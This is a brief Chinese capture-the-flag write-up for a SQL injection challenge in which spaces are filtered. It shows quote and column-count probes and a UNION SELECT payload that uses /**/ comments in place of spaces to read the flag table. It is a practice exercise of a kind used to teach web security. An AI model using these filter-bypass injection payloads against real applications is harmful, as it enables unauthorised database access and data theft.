
# [原创]二十一丶你的空格哪去了 writeup

## 你的空格哪去了

### 简单查询代码

- 输入 `1`
- 输入 `2`

提示 `hacker`！可能过滤了 `'` 或者 `and` 等。

没有提示 `hacker`，说明没有过滤单引号。

根据标题发现可能过滤了空格。

尝试 `and` 后也没有过滤 `and`。

### 探测列数

首先尝试 `1'order/**/by/**/5#`，发现没有信息。

再尝试 `1'order/**/by/**/3#`。

### 注入

然后使用 `-1'union/**/select/**/1,2,3#`。

然后看到我才会告诉你可以用 `select flag from flag` 看到 Flag，尝试 payload:

```sql
-1'union/**/select/**/1,2,flag/**/from/**/flag#
```

### 结果

Flag: `flag{63564494cac7097c}`

Blog: [837K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5$3q4@1k6$3q4E0k6i4y4Q4x3X3g2U0L8R3`.`.](https://bbs.kanxue.com/elink@642K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5$3q4@1k6$3q4E0k6i4y4Q4x3X3g2U0L8R3`.`.)

别问我为什么一下跳到二十一 因为前面还没做完！！！！！！！！！！！！
